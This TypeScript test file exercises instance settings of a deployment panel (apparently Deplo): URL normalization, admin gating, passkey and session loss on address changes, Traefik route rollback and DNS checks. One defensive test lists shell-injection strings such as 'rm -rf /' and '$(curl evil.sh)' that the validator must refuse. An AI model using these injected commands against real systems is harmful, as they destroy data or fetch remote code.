import { test, before, after, beforeEach } from "node:test";
import assert from "node:assert/strict";

import type { PGlite } from "@electric-sql/pglite";

import { makeTestDb, type TestDb } from "../db/test-harness";
import { __setTestDb, __resetTestDb } from "../db/client";
import { instanceSettings } from "../db/schema/control-plane/instance";
import { passkey, session } from "../db/schema/auth";
import { runWithIdentity } from "../auth/request-context";
import {
  seedIdentity,
  TRUNCATE_IDENTITY,
  TEAM_A,
} from "./identity-test-helpers";
import { seedServerRow, TRUNCATE_INFRA } from "./infra-test-helpers";
import {
  __setDnsResolve4ForTest,
  __resetDnsResolve4ForTest,
} from "./domains/dns-check";
import {
  noRouteReason,
  normalizePanelUrl,
  checkPanelDns,
} from "./instance-settings/panel-address";
import { getPanelAddressImpact } from "./instance-settings/panel-address-impact";
import {
  getPanelHttps,
  moveWithRollback,
  setPanelFallback,
  setPanelHttps,
  setPanelUrl,
} from "./instance-settings/panel-route";
import {
  getInstanceSettings,
  instancePublicBaseUrl,
  setGravatarEnabled,
} from "./instance-settings/settings-store";
import { gravatarEnabled } from "../avatar";
import { panelRoute, withPanelRoute } from "../deploy/traefik-stack";
import { __setAgentConnectorForTest } from "../infra/agent-client/connect";
import type { AgentConnection } from "../infra/agent-client/connection";

let db: TestDb;
let pg: PGlite;

const ADMIN = "admin1";
const MEMBER = "member2";

before(async () => {
  ({ db, pg } = await makeTestDb());
  __setTestDb(db);
});

after(async () => {
  __resetTestDb();
  await pg.close();
});

beforeEach(async () => {
  await pg.exec(TRUNCATE_IDENTITY);
  await seedIdentity(db, {
    users: [
      { id: ADMIN, teamId: TEAM_A, role: "owner", isInstanceAdmin: true },
      { id: MEMBER, teamId: TEAM_A, role: "member", isInstanceAdmin: false },
    ],
  });
});

const asUser = <T>(userId: string, fn: () => Promise<T>): Promise<T> =>
  runWithIdentity({ userId, teamId: TEAM_A }, fn);

test("a bare domain is stored as an https URL", () => {
  assert.equal(
    normalizePanelUrl("deplo.example.com"),
    "https://deplo.example.com",
  );
  assert.equal(
    normalizePanelUrl("  deplo.example.com/  "),
    "https://deplo.example.com",
  );
  assert.equal(
    normalizePanelUrl("http://deplo.internal"),
    "http://deplo.internal",
  );
});

test("an IP address is not a panel address, in either scheme", () => {
  for (const bad of [
    "10.0.0.4",
    "http://10.0.0.4:3000",
    "https://198.51.100.7",
  ])
    assert.throws(
      () => normalizePanelUrl(bad),
      /domain name, not an IP address/,
      `must refuse ${bad}`,
    );
});

test("anything that could escape a shell, or carry credentials, is refused", () => {
  for (const bad of [
    "deplo.example.com; rm -rf /",
    "deplo.example.com && curl evil.sh",
    "$(curl evil.sh)",
    "deplo.example.com`id`",
    "https://user:pw@deplo.example.com",
    "https://deplo.example.com/some/path",
    "ftp://deplo.example.com",
    "not a host",
  ]) {
    assert.throws(
      () => normalizePanelUrl(bad),
      new RegExp("."),
      `must refuse ${bad}`,
    );
  }
});

test("the settings name the instance owner, and null when nobody holds it", async () => {
  assert.equal(
    (await asUser(ADMIN, () => getInstanceSettings())).ownerName,
    null,
  );

  await db.insert(instanceSettings).values({
    id: "default",
    ownerUserId: ADMIN,
    updatedAt: new Date().toISOString(),
  });
  assert.equal(
    (await asUser(ADMIN, () => getInstanceSettings())).ownerName,
    ADMIN,
  );
});

test("only an instance admin can move the address", async () => {
  await assert.rejects(
    () => asUser(MEMBER, () => setPanelUrl("deplo.example.com")),
    /admin/i,
  );
  await assert.rejects(
    () => asUser(MEMBER, () => getInstanceSettings()),
    /admin/i,
  );
});

test("a stored address wins over the one the box was installed with", async (t) => {
  const previous = process.env.DEPLO_PUBLIC_URL;
  process.env.DEPLO_PUBLIC_URL = "https://installed.example.com";
  t.after(() => {
    if (previous === undefined) delete process.env.DEPLO_PUBLIC_URL;
    else process.env.DEPLO_PUBLIC_URL = previous;
  });

  assert.equal(
    await asUser(ADMIN, () => instancePublicBaseUrl()),
    "https://installed.example.com",
  );

  const saved = await asUser(ADMIN, () => setPanelUrl("moved.example.com"));
  assert.equal(saved.panelUrl, "https://moved.example.com");
  assert.equal(saved.panelUrlSource, "stored");
  assert.equal(
    await asUser(ADMIN, () => instancePublicBaseUrl()),
    "https://moved.example.com",
  );

  const cleared = await asUser(ADMIN, () => setPanelUrl(null));
  assert.equal(cleared.storedPanelUrl, null);
  assert.equal(cleared.panelUrl, "https://installed.example.com");
  assert.equal(cleared.panelUrlSource, "environment");
});

async function seedPasskeyAndSession(rpId: string) {
  await db.insert(passkey).values({
    id: `pk_${rpId}`,
    userId: ADMIN,
    publicKey: "public",
    credentialID: `cred_${rpId}`,
    counter: 0,
    deviceType: "singleDevice",
    backedUp: false,
    rpId,
  });
  await db.insert(session).values({
    id: "sess_1",
    userId: ADMIN,
    token: "token_1",
    expiresAt: new Date(Date.now() + 60 * 60 * 1000),
  });
}

const withPanelUrl = async <T>(
  url: string,
  fn: () => Promise<T>,
): Promise<T> => {
  const previous = process.env.DEPLO_PUBLIC_URL;
  process.env.DEPLO_PUBLIC_URL = url;
  const { setStoredPublicBaseUrl } = await import("../public-url");
  setStoredPublicBaseUrl(url);
  try {
    return await fn();
  } finally {
    setStoredPublicBaseUrl(null);
    if (previous === undefined) delete process.env.DEPLO_PUBLIC_URL;
    else process.env.DEPLO_PUBLIC_URL = previous;
  }
};

test("an address that does not move counts nothing", async () => {
  await withPanelUrl("https://deplo.example.com", async () => {
    await seedPasskeyAndSession("deplo.example.com");
    const impact = await asUser(ADMIN, () =>
      getPanelAddressImpact("deplo.example.com"),
    );
    assert.equal(impact.hostChanges, false);
    assert.equal(impact.schemeChanges, false);
    assert.equal(
      impact.passkeys,
      0,
      "nothing is lost by saving the same address",
    );
    assert.equal(impact.sessions, 0);
  });
});

test("a new hostname counts the passkeys and sessions it takes with it", async () => {
  await withPanelUrl("https://deplo.example.com", async () => {
    await seedPasskeyAndSession("deplo.example.com");
    const impact = await asUser(ADMIN, () =>
      getPanelAddressImpact("moved.example.com"),
    );
    assert.equal(impact.hostChanges, true);
    assert.equal(impact.losesHttps, false);
    assert.equal(impact.passkeys, 1);
    assert.equal(impact.passkeyPeople, 1);
    assert.equal(impact.sessions, 1);
    assert.equal(impact.sessionPeople, 1);
  });
});

test("a passkey minted for another address is not counted as a loss", async () => {
  await withPanelUrl("https://deplo.example.com", async () => {
    await seedPasskeyAndSession("previous.example.com");
    const impact = await asUser(ADMIN, () =>
      getPanelAddressImpact("moved.example.com"),
    );
    assert.equal(impact.passkeys, 0);
    assert.equal(impact.sessions, 1);
  });
});

test("dropping https is counted as a loss even though the hostname stays", async () => {
  await withPanelUrl("https://deplo.example.com", async () => {
    await seedPasskeyAndSession("deplo.example.com");
    const impact = await asUser(ADMIN, () =>
      getPanelAddressImpact("http://deplo.example.com"),
    );
    assert.equal(impact.hostChanges, false);
    assert.equal(impact.schemeChanges, true);
    assert.equal(impact.losesHttps, true);
    assert.equal(impact.passkeys, 1);
  });
});

test("only an instance admin can ask what an address would break", async () => {
  await assert.rejects(
    () => asUser(MEMBER, () => getPanelAddressImpact("moved.example.com")),
    /admin/i,
  );
});

test("how the panel is served is instance-admin only, both to read and to change", async () => {
  await assert.rejects(() => asUser(MEMBER, () => getPanelHttps()), /admin/i);
  await assert.rejects(
    () => asUser(MEMBER, () => setPanelHttps(false)),
    /admin/i,
  );
});

test("a Deplo whose own host is not added as a server says so, rather than failing", async () => {
  const cert = await asUser(ADMIN, () => getPanelHttps());
  assert.equal(cert.domain, null);
  assert.equal(cert.fallbackDomain, null);
  assert.equal(cert.enabled, false);
  assert.equal(cert.certificateTrusted, null);
  assert.match(cert.unavailable ?? "", /not added here yet/i);
  await assert.rejects(
    () => asUser(ADMIN, () => setPanelHttps(true)),
    /not added here yet/i,
  );
});

test("storing an address still works when there is no route of ours to move", async () => {
  const saved = await asUser(ADMIN, () => setPanelUrl("still.example.com"));
  assert.equal(saved.panelUrl, "https://still.example.com");
});

const ROUTE = {
  domain: "old.example.com",
  fallbackDomain: "deplo-cb007109.nip.io",
  https: true,
  certResolver: "letsencrypt",
  target: "http://deplo:3000",
};

test("an address that does not answer puts the panel back where it was", async () => {
  const applied: string[] = [];
  await assert.rejects(
    () =>
      moveWithRollback({
        from: ROUTE,
        to: { ...ROUTE, domain: "new.example.com" },
        apply: async (route) => {
          applied.push(route.domain);
        },
        probe: async () => ({
          url: "https://new.example.com",
          ok: false,
          error:
            "https://new.example.com did not answer (getaddrinfo ENOTFOUND)",
        }),
      }),
    /did not answer[\s\S]*still on old\.example\.com/i,
  );
  assert.deepEqual(applied, ["new.example.com", "old.example.com"]);
});

test("an address that answers is kept, and nothing is put back", async () => {
  const applied: string[] = [];
  await moveWithRollback({
    from: ROUTE,
    to: { ...ROUTE, domain: "new.example.com" },
    apply: async (route) => {
      applied.push(route.domain);
    },
    probe: async () => ({
      url: "https://new.example.com",
      ok: true,
      error: null,
    }),
  });
  assert.deepEqual(applied, ["new.example.com"]);
});

test("no route of ours: only a panel with no domain at all is a refusal", () => {
  assert.match(
    noRouteReason("http://203.0.113.10:3000") ?? "",
    /domain address/i,
  );
  assert.match(noRouteReason("http://203.0.113.10") ?? "", /domain address/i);
  assert.match(noRouteReason("http://localhost:3000") ?? "", /domain address/i);

  assert.equal(noRouteReason("https://deplo.example.com"), null);
  assert.equal(noRouteReason("https://deplo.203-0-113-10.nip.io"), null);
});

test("Gravatar defaults OFF, and only an instance admin can turn it on", async () => {
  assert.equal(await asUser(ADMIN, () => gravatarEnabled()), false);

  await assert.rejects(
    asUser(MEMBER, () => setGravatarEnabled(true)),
    /admin/i,
    "a plain member must not decide this for the instance",
  );
  assert.equal(await asUser(ADMIN, () => gravatarEnabled()), false);

  await db
    .insert(instanceSettings)
    .values({ id: "default", updatedAt: "2024-01-01T00:00:00.000Z" });
  assert.equal(await asUser(ADMIN, () => gravatarEnabled()), false);
});

test("setGravatarEnabled round-trips, and the read is ungated", async () => {
  await asUser(ADMIN, () => setGravatarEnabled(false));
  assert.equal(await asUser(MEMBER, () => gravatarEnabled()), false);
  assert.equal(
    (await asUser(ADMIN, () => getInstanceSettings())).gravatarEnabled,
    false,
  );

  await asUser(ADMIN, () => setGravatarEnabled(true));
  assert.equal(await asUser(MEMBER, () => gravatarEnabled()), true);
});

const HOST_IP = "203.0.113.10";

test("the panel's DNS check classifies the address the instance answers on", async () => {
  const prevIp = process.env.DEPLO_SERVER_IP;
  process.env.DEPLO_SERVER_IP = HOST_IP;
  await pg.exec(TRUNCATE_INFRA);
  await seedServerRow(db, { id: "srv_self", ip: HOST_IP, host: HOST_IP });
  await asUser(ADMIN, () => setPanelUrl("https://panel.example.com"));

  const at = async (ips: string[]) => {
    __setDnsResolve4ForTest(async () => ips);
    return asUser(ADMIN, checkPanelDns);
  };

  try {
    assert.equal((await at([HOST_IP])).status, "valid");
    assert.equal((await at(["104.16.0.1"])).status, "cloudflare");
    const off = await at(["198.51.100.7"]);
    assert.equal(off.status, "misconfigured");
    assert.deepEqual(off.resolved, ["198.51.100.7"]);
    assert.equal((await at([])).status, "pending");
    assert.equal((await at([])).host, "panel.example.com");

    await asUser(ADMIN, () => setPanelUrl(null));
    await withPanelUrl(`http://${HOST_IP}:3000`, async () => {
      assert.equal((await at([HOST_IP])).status, "unknown");
    });
  } finally {
    __resetDnsResolve4ForTest();
    if (prevIp === undefined) delete process.env.DEPLO_SERVER_IP;
    else process.env.DEPLO_SERVER_IP = prevIp;
  }
});

test("only an instance admin may ask", async () => {
  await assert.rejects(() => asUser(MEMBER, checkPanelDns));
});

const FALLBACK = "deplo-cb00710a.nip.io";

const TRAEFIK_STACK = `services:
  traefik:
    image: traefik:v3.7
    container_name: deplo-traefik
    command:
      - --entrypoints.web.address=:80
      - --entrypoints.websecure.address=:443
      - --certificatesresolvers.letsencrypt.acme.email=ops@acme.com
`;

const panelStack = (domain = "panel.example.com") =>
  withPanelRoute(TRAEFIK_STACK, {
    domain,
    fallbackDomain: FALLBACK,
    https: true,
    certResolver: "letsencrypt",
    target: "http://deplo:3000",
  });

function fakeHost(yaml: string) {
  const state = { yaml };
  __setAgentConnectorForTest(async () => {
    const conn = {
      hello: async () => ({ capabilities: ["hostops"] }),
      hostInfo: async () => ({ traefikComposeYaml: state.yaml }),
      traefikConfig: async (req: { composeYaml: string }) => {
        if (req.composeYaml) state.yaml = req.composeYaml;
        return { ok: true, error: "" };
      },
      close: () => {},
    };
    return conn as unknown as AgentConnection;
  });
  return state;
}

async function withSelfServer<T>(
  t: { after: (fn: () => void) => void },
  fn: () => Promise<T>,
): Promise<T> {
  const prevIp = process.env.DEPLO_SERVER_IP;
  process.env.DEPLO_SERVER_IP = HOST_IP;
  await pg.exec(TRUNCATE_INFRA);
  await seedServerRow(db, { id: "srv_panel", ip: HOST_IP, host: HOST_IP });
  t.after(() => {
    __setAgentConnectorForTest();
    if (prevIp === undefined) delete process.env.DEPLO_SERVER_IP;
    else process.env.DEPLO_SERVER_IP = prevIp;
  });
  return fn();
}

test("the backup address goes off, and stays off when the scheme moves", async (t) => {
  await withSelfServer(t, async () => {
    const host = fakeHost(panelStack());
    assert.equal(
      (await asUser(ADMIN, getPanelHttps)).fallbackDomain,
      FALLBACK,
      "it is on until somebody turns it off",
    );

    const off = await asUser(ADMIN, () => setPanelFallback(false));
    assert.equal(off.panelFallbackDisabled, true);
    assert.equal(panelRoute(host.yaml)?.fallbackDomain, null);

    await asUser(ADMIN, () => setPanelHttps(false));
    assert.equal(panelRoute(host.yaml)?.https, false);
    assert.equal(panelRoute(host.yaml)?.fallbackDomain, null);

    const impact = await asUser(ADMIN, () =>
      getPanelAddressImpact("moved.example.com"),
    );
    assert.equal(impact.panelFallbackUrl, null);

    const on = await asUser(ADMIN, () => setPanelFallback(true));
    assert.equal(on.panelFallbackDisabled, false);
    assert.equal(panelRoute(host.yaml)?.fallbackDomain, FALLBACK);
    assert.equal(on.panelFallbackUrl, `https://${FALLBACK}`);
  });
});

test("the generated address cannot be turned off while it IS the address", async (t) => {
  await withSelfServer(t, async () => {
    fakeHost(panelStack(FALLBACK));
    await assert.rejects(
      () => asUser(ADMIN, () => setPanelFallback(false)),
      /panel's own address/i,
      "there would be no route left at all",
    );
    await assert.rejects(
      () => asUser(MEMBER, () => setPanelFallback(false)),
      /admin/i,
    );
  });
});
